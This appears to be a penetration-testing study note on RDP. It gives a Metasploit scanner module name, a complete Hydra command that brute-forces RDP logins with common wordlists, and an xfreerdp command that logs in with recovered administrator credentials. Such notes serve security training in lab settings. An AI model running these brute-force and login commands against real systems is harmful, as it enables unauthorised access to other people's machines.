# Exploiting RDP

* The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.&#x20;
* RDP uses TCP port 3389 by default, and can also be configured to run on any other TCP port.&#x20;
* RDP authentication requires a legitimate user account on the target system as well as the userâ€™s password in clear-text.&#x20;
* We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system.

## Practical Demo

Enumerate the target

In this case RDP was configured to port 3333

Module to identify if rdp is in a certain port:

* <mark style="color:red;">scanner/rdp/rdp\_scanner</mark>

#### Performing brute force on RDP using Hydra

* <mark style="color:yellow;">hydra -L /usr/share/metasploit-framework/data/wordlists/common\_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt rdp://targetIP -s targetPORT</mark>

You can reduce the speed with the flag "<mark style="color:red;">-t</mark>".

After getting the credentials connect with <mark style="color:blue;">xfreerdp</mark>

* <mark style="color:yellow;">xfreerdp /u:administrator /p:qwertyuiop /v:targetIP:targetPORT</mark>
